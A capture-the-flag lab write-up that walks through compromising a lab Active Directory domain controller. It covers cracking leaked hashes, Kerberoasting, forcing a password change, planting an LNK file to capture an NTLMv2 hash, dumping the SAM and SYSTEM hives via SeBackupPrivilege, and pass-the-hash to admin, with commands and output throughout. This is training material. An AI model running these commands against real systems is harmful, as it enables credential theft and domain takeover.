# [Lab: Building Magic](https://www.hacksmarter.org/courses/8c4fe505-a724-407f-a425-8e17503d4380)

The following information was provided before starting the lab

These entries need to be added to the `/etc/hosts` file
- `buildingmagic.local`
- `dc01.buildingmagic.local`

```
tail -n 2 /etc/hosts
10.1.213.153 buildingmagic.local
10.1.213.153 dc01.buildingmagic.local
````

A leaked Database File:
```
id	username	full_name	role		password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef
```

-----
## Nmap Scan
To get an understanding of the attack surface I first ran an nmap scan
```
sudo nmap -T4 -sS -sC -sV 10.1.213.153 -v -oA BuildingMagic 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-04 03:11:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.BUILDINGMAGIC.LOCAL
| Issuer: commonName=DC01.BUILDINGMAGIC.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-02T21:29:10
| Not valid after:  2026-03-04T21:29:10
| MD5:   cb18:d563:ae1d:22d2:bd56:6b1c:ba62:94b1
|_SHA-1: 4589:0eef:a106:c58c:d5a7:8fcc:0f87:1da5:1d84:6e69
|_ssl-date: 2025-11-04T03:12:17+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BUILDINGMAGIC
|   NetBIOS_Domain_Name: BUILDINGMAGIC
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL
|   DNS_Computer_Name: DC01.BUILDINGMAGIC.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-04T03:11:36+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          Werkzeug httpd 3.1.3 (Python 3.13.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.13.3
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Building Magic Application Portal
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-11-04T03:11:37
|_  start_date: N/A

```

## Hashes From the DB Leak
- Using the tool hashid I determined that the mashes were likely MD5
```
hashid c4a21c4d438819d73d24851e7966229c       
Analyzing 'c4a21c4d438819d73d24851e7966229c'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 

```
 

- Using  [crackstation](https://crackstation.net/) I was able to get two of the hashes in plaintetxt
```
c4a21c4d438819d73d24851e7966229c
61ee643c5043eadbcdc6c9d1e3ebd298
8960516f904051176cc5ef67869de88f
bbd151e24516a48790b2cd5845e7f148
4d14ff3e264f6a9891aa6cea1cfa17cb
078576a0569f4e0b758aedf650cb6d9a
eada74b2fa7f5e142ac412d767831b54
dd4137bab3b52b55f99f18b7cd595448
bfaf794a81438488e57ee3954c27cd75
47d23284395f618bea1959e710bc68ef
```
 - Site like can be used
<img width="1016" height="609" alt="image" src="https://github.com/user-attachments/assets/29ead5d8-91cc-41a4-95cf-a1335592ebfc" />

 
------
## User Enumeration
- Initially I attempt to enumerate users with a null session and guest user but it retuned nothing.
- With the newly ontained user credentials I was able  to enuermate the users on the host

```
netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --users
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
SMB         10.1.213.153    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.213.153    445    DC01             Administrator                 2025-06-15 02:00:21 0       Built-in account for administering the computer/domain 
SMB         10.1.213.153    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.213.153    445    DC01             krbtgt                        2025-05-05 22:18:37 0       Key Distribution Center Service Account 
SMB         10.1.213.153    445    DC01             h.potch                       2025-09-02 17:56:09 0        
SMB         10.1.213.153    445    DC01             r.widdleton                   2025-05-15 21:08:40 0        
SMB         10.1.213.153    445    DC01             r.haggard                     2025-05-15 21:09:04 0        
SMB         10.1.213.153    445    DC01             h.grangon                     2025-05-29 21:32:45 0        
SMB         10.1.213.153    445    DC01             a.flatch                      2025-06-15 02:57:05 0       Project Manager 

```

- I then saved the users to a users.txt file
```
Administrator
Guest
krbtgt
h.potch
r.widdleton
r.haggard
h.grangon
a.flatch
```

## Checking Shares (r.widdleton)
- I found that a share called File-Share existed on the host but I only had READ Access and couldn't view if anything was in the share.
```
netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --shares                
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
SMB         10.1.213.153    445    DC01             [*] Enumerated shares
SMB         10.1.213.153    445    DC01             Share           Permissions     Remark
SMB         10.1.213.153    445    DC01             -----           -----------     ------
SMB         10.1.213.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.213.153    445    DC01             C$                              Default share
SMB         10.1.213.153    445    DC01             File-Share                      Central Repository of Building Magic's files.
SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.213.153    445    DC01             NETLOGON                        Logon server share 
SMB         10.1.213.153    445    DC01             SYSVOL                          Logon server share 

```

```
└─$ smbclient \\\\10.1.213.153\\\File-Share -U r.widdleton%lilronron 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

----
## Kerberoasting
- Using the impacket-GetUserSPNs tool I was able to retrieved a service ticket for the HOGWARDS-DC SPN.
`impacket-GetUserSPNs -dc-ip 10.1.213.153 buildingmagic.local/r.widdleton:lilronron -request`
```
impacket-GetUserSPNs -dc-ip 10.1.213.153 buildingmagic.local/r.widdleton:lilronron -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------------------  ---------  --------  --------------------------  --------------------------  ----------
HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:04.002067  2025-05-15 18:34:51.644710             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de829df8403ef9ea9bd1a41a2028$285a778442acdc33274824822c77e9c28560a9b9307a9c18937628ade2f5a826847e83249af21a4ae7197deec23a729fd34c4811426f5206bb1e5b0fda59a8bf373bed8b796bdfca9e36461a3451a2ce207efb2f75413f9b65b68dd1c02f6091ebabfa71966a9bfb42d56584cb3cff1e26ffed5963e781a1ca4a9307cf6fc30d92076cbb120ce3d79b76065919735ecaad82178b774bfc064214648c518923af8757cb30bc3d9585261c01f9c3915d84c4af0e73e6324c895512897175d6e92718a6946ef6538190f0eb9bff93231d1fa896f40ab64f9862d78d3055f4fffd6eb11a2179919ac842737bf03c34515ae52e1edeba1234e621d32b6ffee7b4abb1be78705e1833b2ef6350e55d09a6cbd34b13722e3f8af868de974b80dd95126dc461dc5e03e6de3dc7dd210259aa6c715bff1ea7763f1beb42e85a11b94f580f3fca25d01431724a559d2f5142233fce6df24d3083493e683a29025ddc2a8178152f5b08dc1fd5b279da72d1ee65424fcb36ec7de3d42943f911bfc4972c10124d6f3c9d8fa9fe50e478281d919b0dd16186ab11ff919b7be0e6d37da0a4a008e0191e1f3fbc3726a2fd6b5ee5b2b0aa29fc0c8079943ba824ee141cf513eb8b05613dcb68ae4fe2ce244d662ac7d6237f9401df271aa37bfc45c35e4cc0351747e0e889abaf1adcf17b321650f44f602a111ae9e07a0505fe54ad37cc0718cd59bf3ca725211c0e402ba89b8c440afbc3c4ba082d318d2a1fa098fc4a9d5a1d9e23d80f082bd05c9c4d4ba1264a1699c7a24c3fe6c8c1b04701ac1eda8b9ff6c4c8a6b002484bb5206a47cdce183d347b4297e7101ad512deae88233b4a6cd1067b6598265921f166a7524a97e5f7727d67ab10f79057a69e2ee53a9ef2515975818d9b49499c7020dd327eda1640dac7e2bdfa8f2ed5ac91ab5344874980433d4574672d79280b894fa61c675809560869d46f524379426c5aca601f7aeec2353a85632a4aef53c4d44198957f37b4a8724313ef482dccdcc1bfa201cd86303f3c35f0fd0ccd5e5c7685a31ef9cfdd532322059841b213b0576e868ea33a2e3b7535256a5770ee2fd004bc381f8d9dac93e01bb228b221557b8eef4f825ce167361fa8fbe30f0c68a7285cc599864639086156f0397eb52345472705456d486dd4b059bc2b5f46dc684845b3f3837f1a165ddd3574731068836af8ade7e2f701ce0eec00c3a69baecc3b19198bc486daa74c179f522654bbdf1ed436aa814903c105ebfb2ef4261e804f1516547162c84053b001fb3b7bb817e41247cf9a05fdafe0a37b9966ceb7ff7a4867e288579c82841097bb83b0c6f9da75342b654c93c51a34280a7a660e10073285ec02c12c74de62f6465d7129430825f6d42e5ea487f4d815d089166498f38108589f2f39698302e71708e4f4b6de5dd676eb7b83a2ae109f412e8bb77d5de93781c6c809c7081d382c9c37e809938a670c0e105466adfe1510ae3bfb919c3eb28f4e4745376c01db27e140cb797a326c94071be00dbad3b52fe06a3dcb50a13b1647
```


## Kerberoasting - Crack the Hash
Using the following command I was able to crack the hash using module 13100 with the rockyou wodlist
- `hashcat.exe -m 13100 hahahahashes.txt rockyou.txt -O`
```
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de829df8403ef9ea9bd1a41a2028$285a778442acdc33274824822c77e9c28560a9b9307a9c18937628ade2f5a826847e83249af21a4ae7197deec23a729fd34c4811426f5206bb1e5b0fda59a8bf373bed8b796bdfca9e36461a3451a2ce207efb2f75413f9b65b68dd1c02f6091ebabfa71966a9bfb42d56584cb3cff1e26ffed5963e781a1ca4a9307cf6fc30d92076cbb120ce3d79b76065919735ecaad82178b774bfc064214648c518923af8757cb30bc3d9585261c01f9c3915d84c4af0e73e6324c895512897175d6e92718a6946ef6538190f0eb9bff93231d1fa896f40ab64f9862d78d3055f4fffd6eb11a2179919ac842737bf03c34515ae52e1edeba1234e621d32b6ffee7b4abb1be78705e1833b2ef6350e55d09a6cbd34b13722e3f8af868de974b80dd95126dc461dc5e03e6de3dc7dd210259aa6c715bff1ea7763f1beb42e85a11b94f580f3fca25d01431724a559d2f5142233fce6df24d3083493e683a29025ddc2a8178152f5b08dc1fd5b279da72d1ee65424fcb36ec7de3d42943f911bfc4972c10124d6f3c9d8fa9fe50e478281d919b0dd16186ab11ff919b7be0e6d37da0a4a008e0191e1f3fbc3726a2fd6b5ee5b2b0aa29fc0c8079943ba824ee141cf513eb8b05613dcb68ae4fe2ce244d662ac7d6237f9401df271aa37bfc45c35e4cc0351747e0e889abaf1adcf17b321650f44f602a111ae9e07a0505fe54ad37cc0718cd59bf3ca725211c0e402ba89b8c440afbc3c4ba082d318d2a1fa098fc4a9d5a1d9e23d80f082bd05c9c4d4ba1264a1699c7a24c3fe6c8c1b04701ac1eda8b9ff6c4c8a6b002484bb5206a47cdce183d347b4297e7101ad512deae88233b4a6cd1067b6598265921f166a7524a97e5f7727d67ab10f79057a69e2ee53a9ef2515975818d9b49499c7020dd327eda1640dac7e2bdfa8f2ed5ac91ab5344874980433d4574672d79280b894fa61c675809560869d46f524379426c5aca601f7aeec2353a85632a4aef53c4d44198957f37b4a8724313ef482dccdcc1bfa201cd86303f3c35f0fd0ccd5e5c7685a31ef9cfdd532322059841b213b0576e868ea33a2e3b7535256a5770ee2fd004bc381f8d9dac93e01bb228b221557b8eef4f825ce167361fa8fbe30f0c68a7285cc599864639086156f0397eb52345472705456d486dd4b059bc2b5f46dc684845b3f3837f1a165ddd3574731068836af8ade7e2f701ce0eec00c3a69baecc3b19198bc486daa74c179f522654bbdf1ed436aa814903c105ebfb2ef4261e804f1516547162c84053b001fb3b7bb817e41247cf9a05fdafe0a37b9966ceb7ff7a4867e288579c82841097bb83b0c6f9da75342b654c93c51a34280a7a660e10073285ec02c12c74de62f6465d7129430825f6d42e5ea487f4d815d089166498f38108589f2f39698302e71708e4f4b6de5dd676eb7b83a2ae109f412e8bb77d5de93781c6c809c7081d382c9c37e809938a670c0e105466adfe1510ae3bfb919c3eb28f4e4745376c01db27e140cb797a326c94071be00dbad3b52fe06a3dcb50a13b1647:rubeushagrid
```

-------
## Use Bloodhound
Bloodhound-ce-python is a tool that allows the collection of the information of a domain to be ingested in bloodhound.
```
bloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -ns 10.1.213.153 -d buildingmagic.local -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: buildingmagic.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.buildingmagic.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.buildingmagic.local
INFO: Found 9 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Connecting to GC LDAP server: dc01.buildingmagic.local
WARNING: Could not resolve GPO link to CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
WARNING: Could not resolve GPO link to cn={16B4CBF5-F6BE-49AA-98C9-F0A424DFB2C4},cn=policies,cn=system,DC=WIZARDING,DC=THM
WARNING: Could not resolve GPO link to CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BUILDINGMAGIC.LOCAL
INFO: Done in 00M 07S

```

After the tool is ran these json files will be uploaded in bloodhound
```
20251103223538_computers.json
20251103223538_containers.json
20251103223538_domains.json
20251103223538_gpos.json
20251103223538_groups.json
20251103223538_ous.json
20251103223538_users.json

```

## Launching Bloodhound
- According to bloodhoun the user R.Haggard has the ability to change the password of H.Potch
<img width="1112" height="220" alt="image" src="https://github.com/user-attachments/assets/e21b21b5-a843-4bb4-b247-6340d3b7e281" />


The user R.HAGGARD@BUILDINGMAGIC.LOCAL has the capability to change the user H.POTCH@BUILDINGMAGIC.LOCAL's password without knowing that user's current password.


Using the following command with BloodyAd I changed the password

```
bloodyAD --host "10.1.213.153" -d "buildingmagic.local" -u "r.haggard" -p "rubeushagrid" set password "h.potch" "newP@ssword2022"
[+] Password changed successfully!
```

### Check if Credentials Are Valid
Netexec can be used to verify the credentials have been changed
```
netexec smb 10.1.213.153 -u 'h.potch' -p 'newP@ssword2022'   
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 

```

## SMB Enumeration (h.potch) 
The user h.potch has Write access to share, File-Share

```
netexec smb 10.1.213.153 -u 'h.potch' -p 'newP@ssword2022' --shares
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
SMB         10.1.213.153    445    DC01             [*] Enumerated shares
SMB         10.1.213.153    445    DC01             Share           Permissions     Remark
SMB         10.1.213.153    445    DC01             -----           -----------     ------
SMB         10.1.213.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.213.153    445    DC01             C$                              Default share
SMB         10.1.213.153    445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.213.153    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                     
```

## LNK Attack
With h.potch having Write access I can use the slinky module to create a link/shortcut file that points to my IP
```
netexec smb 10.1.213.153 -u h.potch -p newP@ssword2022 -M slinky -o SERVER=10.200.16.104 NAME=important
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
SMB         10.1.213.153    445    DC01             [*] Enumerated shares
SMB         10.1.213.153    445    DC01             Share           Permissions     Remark
SMB         10.1.213.153    445    DC01             -----           -----------     ------
SMB         10.1.213.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.213.153    445    DC01             C$                              Default share
SMB         10.1.213.153    445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.213.153    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
SLINKY      10.1.213.153    445    DC01             [+] Found writable share: File-Share
SLINKY      10.1.213.153    445    DC01             [+] Created LNK file on the File-Share share
                                                                                                      
```

Before I ran the prior command I set up responder in an attempt to catch the hash of any user who browses the share 
`sudo responder -I tun0`

```
[SMB] NTLMv2-SSP Client   : 10.1.213.153
[SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon
[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:6238d57d5b51be69:61CF68CA3892F99CE506CC38273B7B63:0101000000000000001FC4FF144DDC01E66B0DCA8FC39D4B00000000020008004B0059004400440001001E00570049004E002D0052004A0045004C005800370038004A004A003200590004003400570049004E002D0052004A0045004C005800370038004A004A00320059002E004B005900440044002E004C004F00430041004C00030014004B005900440044002E004C004F00430041004C00050014004B005900440044002E004C004F00430041004C0007000800001FC4FF144DDC010600040002000000080030003000000000000000000000000040000029983F78C2EFDCA7CEBDC28CB0D1A5F0E9267F918FB94CD0878E3F5458AB4BE80A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310036002E00310030003400000000000000000
```

## Crack h.grangon Hash
I was able to crack this NTLMv2 hash with the 5600 module using hashcat
`hashcat.exe -a 0 -m 5600 hahahahashes.txt rockyou.txt -O`
```
H.GRANGON::BUILDINGMAGIC:6238d57d5b51be69:61cf68ca3892f99ce506cc38273b7b63:0101000000000000001fc4ff144ddc01e66b0dca8fc39d4b00000000020008004b0059004400440001001e00570049004e002d0052004a0045004c005800370038004a004a003200590004003400570049004e002d0052004a0045004c005800370038004a004a00320059002e004b005900440044002e004c004f00430041004c00030014004b005900440044002e004c004f00430041004c00050014004b005900440044002e004c004f00430041004c0007000800001fc4ff144ddc010600040002000000080030003000000000000000000000000040000029983f78c2efdca7cebdc28cb0d1a5f0e9267f918fb94cd0878e3f5458ab4be80a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00310036002e003100300034000000000000000000:magic4ever
```

## Bloodhound (H.grangon)
According to bloodhound and additional confirmation with the netexec tool I confirmed that h.grangon has access to winrm
<img width="953" height="256" alt="image" src="https://github.com/user-attachments/assets/b13dab61-f10b-440f-a65b-45014ddb396b" />




```
└─$ netexec winrm 10.1.213.153 -u h.grangon -p magic4ever  
WINRM       10.1.213.153    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL)
WINRM       10.1.213.153    5985   DC01             [+] BUILDINGMAGIC.LOCAL\h.grangon:magic4ever (Pwn3d!)
```

-----
## Iniitial Foothold
```
evil-winrm -i 10.1.213.153 -u h.grangon -p 'magic4ever'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.grangon\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\h.grangon\Desktop> ls


    Directory: C:\Users\h.grangon\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/2/2025   7:41 PM           2308 Microsoft Edge.lnk
-a----          9/2/2025   7:41 PM             32 user.txt


*Evil-WinRM* PS C:\Users\h.grangon\Desktop> cat user.txt
701b51527b6d4105d9b16b412af2d604

```

## Check Privelges
H.grangon has the SeBackupPrivilege
```
*Evil-WinRM* PS C:\Users\h.grangon\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

The following article explains how to exploit this by saving the SAM and SYSTEM file, transferring them to my machine and using the pypykatz to dump the NTLM hashes

[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

```
*Evil-WinRM* PS C:\Users\h.grangon\Desktop> mkdir C:\Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         11/3/2025   8:19 PM                Temp


*Evil-WinRM* PS C:\Users\h.grangon\Desktop> cd C:\Temp
*Evil-WinRM* PS C:\Temp> reg save hklm\sam C:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system C:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/3/2025   8:20 PM          49152 sam
-a----         11/3/2025   8:20 PM       16629760 system


*Evil-WinRM* PS C:\Temp> download sam
                                                                                                                                                                                                                                
Info: Downloading C:\Temp\sam to sam                                                                                                                                                                                            
                                                                                                                                                                                                                                
Info: Download successful!                                                                                                                                                                                                      
*Evil-WinRM* PS C:\Temp> download system
                                                                                                                                                                                                                                
Info: Downloading C:\Temp\system to system                                                                                                                                                                                      
                                                                                                                                                                                                                                
Info: Download successful!                                                                      
```

## Dump Hashes
```
└─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: f61a94fb13f74350a1f87f509c8c455c
============== SAM hive secrets ==============
HBoot Key: 1412e6548129435016d5f9cda187a78a10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
---


## Password Spray
The Administrator credentials were no longer valid
```
└─$ netexec smb 10.1.213.153 -u Administrator -H 520126a03f5d5a8d836f1c4f34ede7ce
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\Administrator:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 

```

I took the users.txt list I created earlier and used the administratior Hash to see if it worked with any other accoount and found that a.flatch had administrator access
![[Pasted image 20251103233127.png]]

```
└─$ netexec smb 10.1.213.153 -u users.txt -H 520126a03f5d5a8d836f1c4f34ede7ce --continue-on-success
SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\Administrator:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\Guest:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\krbtgt:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\h.potch:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\r.widdleton:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\r.haggard:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\h.grangon:520126a03f5d5a8d836f1c4f34ede7ce STATUS_LOGON_FAILURE 
SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)
                                                                                                                                  
```


## Shell As Admin (a.flatch)
I could then login using winrm and access the Adminstrator Desktop to directory to obtain the root.txt file
```
└─$ netexec winrm 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce 
WINRM       10.1.213.153    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL)
WINRM       10.1.213.153    5985   DC01             [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)

```

```
evil-winrm -i 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a.flatch\Documents> type C:\Users\Administrator\Desktop\root.txt
9557e65743416cfadadfb17f89b8651b
*Evil-WinRM* PS C:\Users\a.flatch\Documents> 

```
